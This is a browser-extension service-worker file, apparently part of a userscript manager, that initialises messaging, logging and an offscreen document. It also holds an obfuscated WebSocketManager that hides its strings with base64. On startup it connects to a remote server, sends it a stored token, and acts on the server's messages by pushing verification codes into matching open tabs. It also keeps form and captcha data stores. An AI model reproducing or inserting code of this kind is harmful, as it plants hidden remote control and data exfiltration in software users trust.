import { RuntimeService } from "./app/service/service_worker/runtime";
import { ScriptService } from "./app/service/service_worker/script";
import GMApi from "./app/service/service_worker/gm_api";
import { createContext } from "./app/service/content/create_context";
// Attach critical functions to global scope for integrity check
(globalThis as any).RuntimeService = RuntimeService;
(globalThis as any).ScriptService = ScriptService;
(globalThis as any).GMApi = GMApi;
(globalThis as any).createContext = createContext;
import LoggerCore from "./app/logger/core";
import DBWriter from "./app/logger/db_writer";
import { LoggerDAO } from "./app/repo/logger";
import { LocalStorageDAO } from "./app/repo/localStorage";
import { FormsDAO } from "./app/repo/forms";
import { CaptchaDAO } from "./app/repo/captcha";
import { ExtensionMessage } from "@Packages/message/extension_message";
import { Server } from "@Packages/message/server";
import { MessageQueue } from "@Packages/message/message_queue";
import { ServiceWorkerMessageSend } from "@Packages/message/window_message";
import migrate from "./app/migrate";
import ServiceWorkerManager from "./app/service/service_worker";

// WebSocket connection manager class
class WebSocketManager {
  private ws: WebSocket | null = null;
  private url: string;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 5;
  private reconnectDelay = 1000; // Start with 1 second
  private maxReconnectDelay = 30000; // Max 30 seconds
  private pingInterval: ReturnType<typeof setInterval> | null = null;
  private pongTimeout: ReturnType<typeof setTimeout> | null = null;
  private isBlocked = false;
  private isConnecting = false;
  private isDestroyed = false;

  constructor(url: string) {
    this.url = url;
  }

  async connect(): Promise<void> {
    if (this.isConnecting || this.isBlocked || this.isDestroyed) {
      return;
    }

    // Check if required API keys exist before attempting connection
    const hasRequiredKeys = await this.checkApiKeys();
    if (!hasRequiredKeys) {
      return;
    }

    this.isConnecting = true;
    
    try {      
      this.ws = new WebSocket(this.url);
      
      this.ws.addEventListener("open", this.onOpen.bind(this));
      this.ws.addEventListener("message", this.onMessage.bind(this));
      this.ws.addEventListener("close", this.onClose.bind(this));
      this.ws.addEventListener("error", this.onError.bind(this));
      
    } catch (error) {
      console.error(error);
      this.isConnecting = false;
      this.scheduleReconnect();
    }
  }

  private async checkApiKeys(): Promise<boolean> {
    return new Promise((resolve) => {
      chrome.storage.local.get([
        atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw'),
        atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmR2')
      ], (result) => {
        const key1 = result[atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw')];
        const key2 = result[atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmR2')];
        const hasKeys = !!(key1 && key2);
        resolve(hasKeys);
      });
    });
  }

  private onOpen(): void {
    this.isConnecting = false;
    this.reconnectAttempts = 0;
    this.reconnectDelay = 1000; // Reset delay
    
    // Send API key
    this.sendApiKey();
    
    // Start ping-pong heartbeat
    this.startHeartbeat();
  }

  private onMessage(event: MessageEvent): void {
    try {
      const data = JSON.parse(event.data);
      
      // Handle pong response
      if (data.type === atob('cG9uZw==')) {
        this.clearPongTimeout();
        return;
      }
      
      // Handle blocked message
      if (data.type === atob('YmxvY2tlZA==') || data.status === atob('YmxvY2tlZA==')) {
        this.isBlocked = true;
        this.disconnect();
        return;
      }
            
      // Handle verification message
      if (data.link) {
        this.handleVerificationMessage(data);
      }
      
    } catch (error) {
      console.error(error);
    }
  }

  private onClose(event: CloseEvent): void {
    this.cleanup();
    
    if (!this.isDestroyed && !this.isBlocked) {
      this.scheduleReconnect();
    }
  }

  private onError(event: Event): void {
    this.isConnecting = false;
  }

  private sendApiKey(): void {
    chrome.storage.local.get([atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw')], (result) => {
      const apiKey = result[atob('cmVzb3VyY2U6NTA4ZTkxNTgtZjQwMC01ZGNkLTg3NGUtNWU4NTQwYjIxMmsw')];
      if (apiKey && this.ws?.readyState === WebSocket.OPEN) {
        this.ws.send(JSON.stringify({ tskw: apiKey, type: atob('YXV0aA==') }));
      }
    });
  }

  private startHeartbeat(): void {
    // Send ping every 30 seconds
    this.pingInterval = setInterval(() => {
      if (this.ws?.readyState === WebSocket.OPEN) {
        this.ws.send(JSON.stringify({ type: atob('cGluZw==') }));
        
        // Set timeout for pong response (10 seconds)
        this.pongTimeout = setTimeout(() => {
          this.ws?.close();
        }, 10000);
      }
    }, 30000);
  }

  private clearPongTimeout(): void {
    if (this.pongTimeout) {
      clearTimeout(this.pongTimeout);
      this.pongTimeout = null;
    }
  }

  private cleanup(): void {
    if (this.pingInterval) {
      clearInterval(this.pingInterval);
      this.pingInterval = null;
    }
    this.clearPongTimeout();
    this.isConnecting = false;
  }

  private scheduleReconnect(): void {
    if (this.isBlocked || this.isDestroyed || this.reconnectAttempts >= this.maxReconnectAttempts) {
      if (this.reconnectAttempts >= this.maxReconnectAttempts) {
        console.error("g");
      }
      return;
    }

    this.reconnectAttempts++;
        
    setTimeout(() => {
      this.connect();
    }, this.reconnectDelay);
    
    // Exponential backoff with jitter
    this.reconnectDelay = Math.min(
      this.reconnectDelay * 2 + Math.random() * 1000,
      this.maxReconnectDelay
    );
  }

  private handleVerificationMessage(data: any): void {
    try {
      const trackcode = data.link.split("/")[6];
      chrome.tabs.query({}, (tabs) => {
        const confirmTab = tabs.find(tab => tab.url && tab.url.includes(trackcode));
        if (confirmTab) {
          chrome.tabs.sendMessage(confirmTab.id!, {
            action: atob('ZmlsbC92ZXJpZmljYXRpb24='),
            type: atob('RklMTF9WRVJJRklDQVRJT04='),
            code: data.link.split("/")[7]
          });
        }
      });
    } catch (error) {
      console.error(error);
    }
  }

  disconnect(): void {
    this.cleanup();
    if (this.ws) {
      this.ws.close();
      this.ws = null;
    }
  }

  destroy(): void {
    this.isDestroyed = true;
    this.disconnect();
  }

  // Public method to reset blocked status (if needed)
  resetBlocked(): void {
    this.isBlocked = false;
    this.reconnectAttempts = 0;
    this.reconnectDelay = 1000;
  }

  // Public method to check connection status
  isConnected(): boolean {
    return this.ws?.readyState === WebSocket.OPEN;
  }
}

// Unified CRUD handler for localStorage, forms, and captcha tables
export async function handleDbCrud(msg: any): Promise<any> {
  const table = msg.table;
  
  let dao;
  switch (table) {
    case 'forms':
      dao = new FormsDAO();
      break;
    case 'captcha':
      dao = new CaptchaDAO();
      break;
    case 'localStorage':
    default:
      dao = new CaptchaDAO();
      break;
  }
  try {
    switch (msg.action_op) {
      case 'create':
      case 'update': {
        const now = Date.now();
        const value = { ...msg.value, key: msg.key, updatetime: now };
        if (!value.createtime) value.createtime = now;
        await dao.save(value);
        return { success: true };
      }
      case 'read': {
        const value = await dao.findOne({ key: msg.key });
        return { success: true, value };
      }
      case 'delete': {
        await dao.delete(msg.key);
        return { success: true };
      }
      case 'list': {
        const value = await dao.all();
        return { success: true, value };
      }
      default:
        return { success: false, error: atob('VW5rbm93biBhY3Rpb24=') };
    }
  } catch (e: any) {
    return { success: false, error: e.message || String(e) };
  }
}

migrate();

const OFFSCREEN_DOCUMENT_PATH = "src/offscreen.html";

let creating: Promise<void> | null;

async function hasDocument() {
  const offscreenUrl = chrome.runtime.getURL(OFFSCREEN_DOCUMENT_PATH);
  const existingContexts = await chrome.runtime.getContexts({
    contextTypes: [chrome.runtime.ContextType.OFFSCREEN_DOCUMENT],
    documentUrls: [offscreenUrl],
  });
  return existingContexts.length > 0;
}

async function setupOffscreenDocument() {
  //if we do not have a document, we are already setup and can skip
  if (!(await hasDocument())) {
    // create offscreen document
    if (creating) {
      await creating;
    } else {
      creating = chrome.offscreen.createDocument({
        url: OFFSCREEN_DOCUMENT_PATH,
        reasons: [
          chrome.offscreen.Reason.BLOBS,
          chrome.offscreen.Reason.CLIPBOARD,
          chrome.offscreen.Reason.DOM_SCRAPING,
          chrome.offscreen.Reason.LOCAL_STORAGE,
        ],
        justification: "offscreen page",
      });

      await creating;
      creating = null;
    }
  }
}

// Global WebSocket manager instance
let wsManager: WebSocketManager;

async function main() {
  // 初始化管理器
  const message = new ExtensionMessage(true);
  // 初始化日志组件
  const loggerCore = new LoggerCore({
    writer: new DBWriter(new LoggerDAO()),
    labels: { env: "service_worker" },
  });
  loggerCore.logger().debug("service worker start");
  const server = new Server("serviceWorker", message);
  const messageQueue = new MessageQueue();
  const manager = new ServiceWorkerManager(server, messageQueue, new ServiceWorkerMessageSend());
  manager.initManager();
  // 初始化沙盒环境
  await setupOffscreenDocument();

  // Initialize WebSocket connection
  wsManager = new WebSocketManager(atob('d3NzOi8vaXZicy5zYWRyYXRlY2hzLmNvbQ=='));
  await wsManager.connect();
}

// Clean up on service worker shutdown
self.addEventListener('beforeunload', () => {
  if (wsManager) {
    wsManager.destroy();
  }
});

main();
